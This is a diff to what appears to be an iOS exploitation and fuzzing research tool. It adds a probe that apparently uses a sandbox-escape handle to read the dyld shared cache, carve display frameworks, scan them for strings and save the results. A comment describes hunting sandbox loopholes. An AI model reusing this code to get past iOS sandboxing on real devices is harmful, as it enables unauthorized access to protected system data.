@@ -47734,6 +47734,205 @@ static void p_bq114(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq115 — v274: карвинг iOS QuartzCore + BackBoard/FrontBoard/PaperBoard
+// из dycache (§264/§266). bq111: строки 'functions.list' НЕТ в dycache → имя
+// файла строится из кусков или код в backboardd. Карвим ключевые display-фреймворки
+// (p_pprp-механика: ВСЕ маппинги ВСЕХ сабфайлов → VA-непрерывный буфер) и
+// сканируем on-device иглами: 'functions.list', 'functions', 'fc_has_gamma_luts',
+// 'CA::OGL', 'PBUIMappedImageCacheManager', 'gamma_luts'.
+static void p_bq115(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq115] v274: карвинг display-фреймворков (§264)");
+    fsync(fileno(stderr));
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq115] CONTROL §170 -> handle %lld%s", (long long)h,
+        h < 0 ? " *** NO ESCAPE ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) return;
+
+    const char *candirs[] = {
+        "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld",
+        "/System/Library/Caches/com.apple.dyld",
+        "/System/Library/dyld",
+        "/private/var/db/dyld",
+    };
+    char cdir[1024] = {0};
+    for (unsigned i = 0; i < sizeof(candirs)/sizeof(candirs[0]) && !cdir[0]; i++) {
+        DIR *pd = opendir(candirs[i]);
+        if (!pd) continue;
+        struct dirent *pe;
+        while ((pe = readdir(pd)))
+            if (strstr(pe->d_name, "dyld_shared_cache_arm64e")) {
+                snprintf(cdir, sizeof(cdir), "%s", candirs[i]); break;
+            }
+        closedir(pd);
+    }
+    if (!cdir[0]) { LOG("[bq115] кэш-каталог не найден"); bad_query_release(h); return; }
+
+    NSMutableArray *subs = [NSMutableArray array];
+    NSString *headFile = nil;
+    DIR *cd = opendir(cdir);
+    struct dirent *ce;
+    while (cd && (ce = readdir(cd))) {
+        if (ce->d_name[0] == '.') continue;
+        if (strstr(ce->d_name, ".symbols")) continue;
+        if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+        char p[1400];
+        snprintf(p, sizeof(p), "%s/%s", cdir, ce->d_name);
+        struct stat st;
+        if (stat(p, &st) == 0 && S_ISREG(st.st_mode)) {
+            [subs addObject:[NSString stringWithUTF8String:p]];
+            if (!strchr(ce->d_name, '.')) headFile = [NSString stringWithUTF8String:p];
+        }
+    }
+    if (cd) closedir(cd);
+    if (!headFile) headFile = subs[0];
+    LOG("[bq115] head %s, %d сабфайлов", headFile.lastPathComponent.UTF8String,
+        (int)subs.count);
+    fsync(fileno(stderr));
+
+    int fd = open(headFile.fileSystemRepresentation, O_RDONLY);
+    struct stat cst;
+    fstat(fd, &cst);
+    uint64_t fsize = (uint64_t)cst.st_size;
+    void *map = mmap(NULL, (size_t)fsize, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
+    if (fd < 0 || map == MAP_FAILED) {
+        LOG("[bq115] head errno %d", errno);
+        if (fd >= 0) close(fd);
+        bad_query_release(h); return;
+    }
+    struct bq14_cache_header *hdr = (struct bq14_cache_header *)map;
+    uint32_t imgOff = 0, imgCnt = 0; BOOL found = NO;
+    for (uint32_t o4 = 0x18; o4 + 8 <= hdr->mappingOffset && !found; o4 += 4) {
+        uint32_t o = ((uint32_t *)((char *)hdr + o4))[0];
+        uint32_t c = ((uint32_t *)((char *)hdr + o4))[1];
+        if (c < 100 || c > 40000) continue;
+        if (!o || (uint64_t)o + (uint64_t)c * 32 > fsize) continue;
+        BOOL ok = YES;
+        for (int probe = 0; probe < 3 && ok; probe++) {
+            uint32_t idx = probe == 0 ? 0 : (probe == 1 ? c / 2 : c - 1);
+            uint64_t raw[4] = {0,0,0,0};
+            memcpy(raw, (char *)map + o + (uint64_t)idx * 32, 32);
+            char pth[256];
+            if (!bq14_path_at(fd, raw[3], fsize, pth, sizeof(pth))) ok = NO;
+        }
+        if (ok) { imgOff = o; imgCnt = c; found = YES; }
+    }
+    if (!found) {
+        LOG("[bq115] таблица образов НЕ валидирована");
+        munmap(map, (size_t)fsize); close(fd); bad_query_release(h); return;
+    }
+    LOG("[bq115] images: off=0x%x cnt=%u", imgOff, imgCnt);
+    fsync(fileno(stderr));
+
+    static const char *targets[] = {
+        "/System/Library/Frameworks/QuartzCore.framework/QuartzCore",
+        "/System/Library/PrivateFrameworks/BackBoardServices.framework/BackBoardServices",
+        "/System/Library/PrivateFrameworks/FrontBoardServices.framework/FrontBoardServices",
+        "/System/Library/PrivateFrameworks/PaperBoardUI.framework/PaperBoardUI",
+        "/System/Library/PrivateFrameworks/SpringBoardFoundation.framework/SpringBoardFoundation",
+    };
+    static const char *needles[] = {
+        "functions.list", "functions.data", "fc_has_gamma_luts",
+        "gamma_luts", "CA::OGL", "PBUIMappedImageCacheManager",
+    };
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    for (unsigned t = 0; t < sizeof(targets)/sizeof(targets[0]); t++) {
+        uint64_t addr = 0;
+        for (uint32_t i = 0; i < imgCnt; i++) {
+            uint64_t raw[4] = {0,0,0,0};
+            memcpy(raw, (char *)map + imgOff + (uint64_t)i * 32, 32);
+            char pth[400];
+            if (!bq14_path_at(fd, raw[3], fsize, pth, sizeof(pth))) continue;
+            if (strcmp(pth, targets[t]) == 0) { addr = raw[0]; break; }
+        }
+        if (!addr) { LOG("[bq115] %s: НЕ в таблице", targets[t]); continue; }
+        // размер = расстояние до следующего образа (cap 40MB)
+        uint64_t next = ~0ULL;
+        for (uint32_t i = 0; i < imgCnt; i++) {
+            uint64_t raw[4] = {0,0,0,0};
+            memcpy(raw, (char *)map + imgOff + (uint64_t)i * 32, 32);
+            if (raw[0] > addr && raw[0] < next) next = raw[0];
+        }
+        uint64_t want = (next == ~0ULL ? 0x4000000ULL : next - addr);
+        if (want > 0x4000000ULL) want = 0x4000000ULL;
+        LOG("[bq115] %s @0x%llx, размер до след. образа %llu",
+            strrchr(targets[t], '/') + 1, (unsigned long long)addr,
+            (unsigned long long)want);
+        fsync(fileno(stderr));
+
+        // Собираем ВСЕ маппинги всех сабфайлов, пересекающие [addr, addr+want)
+        // (p_pprp-механика): VA-непрерывный буфер с mach_header в начале.
+        unsigned char *buf = (unsigned char *)calloc(1, (size_t)want);
+        uint64_t filled = 0;
+        for (NSString *sf in subs) {
+            int sfd = open(sf.fileSystemRepresentation, O_RDONLY);
+            if (sfd < 0) continue;
+            struct bq14_cache_header sh = {0};
+            if (pread(sfd, &sh, sizeof(sh), 0) != sizeof(sh) ||
+                memcmp(sh.magic, "dyld_v1", 7) != 0 ||
+                sh.mappingCount > 64 || sh.mappingOffset > (1u << 20)) {
+                close(sfd); continue;
+            }
+            struct bq14_mapping_info mm[64];
+            memset(mm, 0, sizeof(mm));
+            if (pread(sfd, mm, sh.mappingCount * sizeof(struct bq14_mapping_info),
+                      sh.mappingOffset) !=
+                (ssize_t)(sh.mappingCount * sizeof(struct bq14_mapping_info))) {
+                close(sfd); continue;
+            }
+            for (uint32_t m = 0; m < sh.mappingCount; m++) {
+                uint64_t ma = mm[m].address, msz = mm[m].size,
+                         mfo = mm[m].fileOffset;
+                if (ma < addr || ma >= addr + want) continue;
+                uint64_t rel = ma - addr;
+                uint64_t chunk = (rel + msz > want) ? (want - rel) : msz;
+                if (rel + chunk > want) chunk = want - rel;
+                unsigned char *tmp = (unsigned char *)malloc((size_t)chunk);
+                ssize_t got = pread(sfd, tmp, (size_t)chunk, (off_t)mfo);
+                if (got == (ssize_t)chunk) {
+                    memcpy(buf + rel, tmp, (size_t)chunk);
+                    filled += chunk;
+                } else {
+                    LOG("[bq115]   map @+%llu: pread %zd/%llu — пропуск",
+                        (unsigned long long)rel, got, (unsigned long long)chunk);
+                }
+                free(tmp);
+            }
+            close(sfd);
+        }
+        // контроль: магия mach-o по смещению 0
+        uint32_t magic0 = *(uint32_t *)buf;
+        LOG("[bq115]   filled %llu/%llu, magic@0 = 0x%x (%s)", 
+            (unsigned long long)filled, (unsigned long long)want, magic0,
+            magic0 == 0xFEEDFACF ? "OK MH_64" : "НЕ mach_header!");
+        // on-device иглы
+        for (unsigned k = 0; k < sizeof(needles)/sizeof(needles[0]); k++) {
+            void *hit = memmem(buf, (size_t)want, needles[k], strlen(needles[k]));
+            if (hit)
+                LOG("[bq115]   needle %-26s FOUND @+0x%llx", needles[k],
+                    (unsigned long long)((unsigned char *)hit - buf));
+        }
+        // сохраняем карв (для Mac-RE)
+        NSString *out = [docs stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"carve-ios-%s.bin", strrchr(targets[t], '/') + 1]];
+        FILE *o = fopen(out.fileSystemRepresentation, "wb");
+        if (o) { fwrite(buf, 1, (size_t)want, o); fclose(o);
+            LOG("[bq115]   saved %llu -> %@", (unsigned long long)want,
+                out.lastPathComponent); }
+        free(buf);
+        fsync(fileno(stderr));
+    }
+    munmap(map, (size_t)fsize);
+    close(fd);
+    bad_query_release(h);
+    LOG("[bq115] ИТОГ: карвинг завершён");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -56362,6 +56561,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ112")) { p_bq112(); LOG("[probe13] bq112-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ113")) { p_bq113(); LOG("[probe13] bq113-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ114")) { p_bq114(); LOG("[probe13] bq114-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ115")) { p_bq115(); LOG("[probe13] bq115-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
